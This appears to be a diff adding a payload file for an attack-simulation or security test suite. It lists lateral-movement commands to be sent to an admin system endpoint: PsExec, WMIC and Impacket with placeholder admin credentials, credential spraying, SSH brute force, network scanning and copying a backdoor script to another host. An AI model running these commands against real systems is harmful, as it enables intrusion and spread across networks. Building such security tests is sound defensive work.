@@ -1,0 +1,28 @@
+# Lateral Movement Attack Techniques
+# Format: method|endpoint|payload|expected_code|attack_chain_id|description
+# Phase 4: Lateral Movement - Expanding foothold across network
+
+# SMB/Windows Lateral Movement
+POST|/api/admin/system|{"command":"net use \\\\192.168.1.10\\admin$ /user:administrator password123"}|200|4.1|SMB lateral movement via net use
+POST|/api/admin/system|{"command":"psexec \\\\192.168.1.10 -u administrator -p password123 cmd.exe"}|200|4.2|PsExec lateral movement
+POST|/api/admin/system|{"command":"wmic /node:192.168.1.10 /user:administrator /password:password123 process call create cmd.exe"}|200|4.3|WMIC lateral movement
+
+# SSH/Linux Lateral Movement  
+POST|/api/admin/system|{"command":"ssh -o StrictHostKeyChecking=no admin@192.168.1.10 'whoami'"}|200|4.4|SSH lateral movement
+POST|/api/admin/system|{"command":"scp -o StrictHostKeyChecking=no /tmp/backdoor.sh admin@192.168.1.10:/tmp/"}|200|4.5|SCP file transfer for lateral movement
+POST|/api/admin/system|{"command":"sshpass -p 'password123' ssh admin@192.168.1.10 'id'"}|200|4.6|SSH password-based lateral movement
+
+# Credential-based Lateral Movement
+POST|/api/admin/system|{"command":"crackmapexec smb 192.168.1.0/24 -u administrator -p password123"}|200|4.7|Credential spraying across network
+POST|/api/admin/system|{"command":"hydra -L users.txt -P passwords.txt 192.168.1.10 ssh"}|200|4.8|SSH brute force for lateral movement
+POST|/api/admin/system|{"command":"medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh"}|200|4.9|Medusa SSH brute force
+
+# Service-based Lateral Movement
+POST|/api/admin/system|{"command":"nmap -p 22,80,443,3389 192.168.1.0/24"}|200|4.10|Network service enumeration
+POST|/api/admin/system|{"command":"telnet 192.168.1.10 23"}|200|4.11|Telnet lateral movement attempt
+POST|/api/admin/system|{"command":"rdesktop -u administrator -p password123 192.168.1.10"}|200|4.12|RDP lateral movement
+
+# Advanced Lateral Movement
+POST|/api/admin/system|{"command":"powershell -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe' -ComputerName 192.168.1.10\""}|200|4.13|PowerShell WMI lateral movement
+POST|/api/admin/system|{"command":"impacket-psexec administrator:password123@192.168.1.10"}|200|4.14|Impacket PsExec lateral movement
+POST|/api/admin/system|{"command":"crackmapexec winrm 192.168.1.0/24 -u administrator -p password123"}|200|4.15|WinRM lateral movement via crackmapexec
